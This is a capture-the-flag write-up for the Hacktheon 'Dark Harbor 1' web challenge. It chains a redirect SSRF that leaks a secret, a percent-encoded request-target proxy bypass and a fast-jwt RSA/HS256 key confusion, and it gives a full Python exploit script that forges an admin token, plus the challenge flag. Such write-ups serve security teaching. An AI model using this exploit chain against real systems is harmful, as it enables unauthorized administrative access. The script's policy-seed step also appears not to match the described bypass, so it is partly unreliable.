---
title: "Hacktheon Sejong 2026 Quals Dark Harbor 1 Writeup"
description: "Hacktheon Sejong 2026 Quals Dark Harbor 1 writeup"
---

# Dark Harbor 1

### Summary

The target is the internal admin console produced by the api-server. Using a redirect SSRF, I read the internal config and `HMAC_SECRET`, then chained together a local JWT and a policy seed before exploiting a key-interpretation difference in `fast-jwt` to issue an admin policy token.

### Analysis

The first step was a redirect SSRF in `/build/fetch-artifact`. The server only validated the initial URL and never re-checked the destination after a redirect. Going through a public redirector to read `api-server:6000/config` reveals the internal routing information and `HMAC_SECRET`.

With this secret, build the api-server's local JWT key.

```text
LOCAL_JWT_KEY = HMAC-SHA256(HMAC_SECRET, "darkharbor-local-jwt").hexdigest()
```

Minting a `role=pipeline_admin`, `iss=darkharbor-local` token with this key gives access to the pipeline admin API.

Next is the policy seed. If you embed a public key PEM in the output of the first failure of a JUnit report and upload it, the policy engine ingests that PEM as a JWKS entry. `/internal/policy-seed` is blocked at the edge proxy, but mixing an absolute-form request target with percent-encoding bypasses it.

```text
request target = http://api-server/%69nternal/policy-seed
```

The edge proxy does not see this as `/internal`, while Fastify decodes it and routes it to `/internal/policy-seed`.

The last piece is the verification difference in `fast-jwt`. The policy engine prepends an audit banner newline to the seeded PEM.

```text
key = "\n" + public_key_pem
```

This value is not recognized as an RSA public key and is instead used like an HS256 secret. Using the same value as the HMAC key, I minted a `role=admin` policy token and read `/internal/admin-console.json` via the request-target bypass.

### Exploit

```python
import base64
import hashlib
import hmac
import json
import subprocess
import time
from pathlib import Path

import requests

BASE = "http://15.164.173.78:8080"
WORKSPACE_ID = 559
WORKSPACE_TOKEN = "<workspace_token>"
HMAC_SECRET = "a]Kx9#mP$vQ2nR7wF4jL8cB5hT0yU3eA"
KID = "axii-kid-559"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def hs256(secret: bytes, header: dict, payload: dict) -> str:
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = b64url(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())
    return signing_input + "." + sig

subprocess.run(["openssl", "genrsa", "-out", "/tmp/dh_rsa.pem", "2048"], check=True)
subprocess.run(["openssl", "rsa", "-in", "/tmp/dh_rsa.pem", "-pubout", "-out", "/tmp/dh_rsa_pub.pem"], check=True)
pub = Path("/tmp/dh_rsa_pub.pem").read_text()

xml = (
    '<?xml version="1.0"?>'
    '<testsuite name="seed"><testcase name="pem">'
    '<failure><![CDATA[' + pub + ']]></failure>'
    '</testcase></testsuite>'
)
r = requests.post(
    f"{BASE}/api/builds/{WORKSPACE_ID}/test-report",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/xml",
    },
    data=xml,
)
r.raise_for_status()
report_id = r.json()["report_id"]

r = requests.post(
    BASE + "/",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/json",
    },
    data=json.dumps({
        "workspace_id": WORKSPACE_ID,
        "report_id": report_id,
        "kid": KID,
    }),
)

now = int(time.time())
policy_token = hs256(
    ("\n" + pub).encode(),
    {"alg": "HS256", "typ": "JWT", "kid": KID},
    {"sub": "axii", "role": "admin", "iat": now, "exp": now + 600},
)

print("Use curl:")
print(
    "curl --request-target 'http://api-server/%69nternal/admin-console.json' "
    f"'{BASE}/' -H 'X-Policy-Token: {policy_token}'"
)
```

### Flag

`hacktheon2026{sil3nt_tid3_bre4ch}`
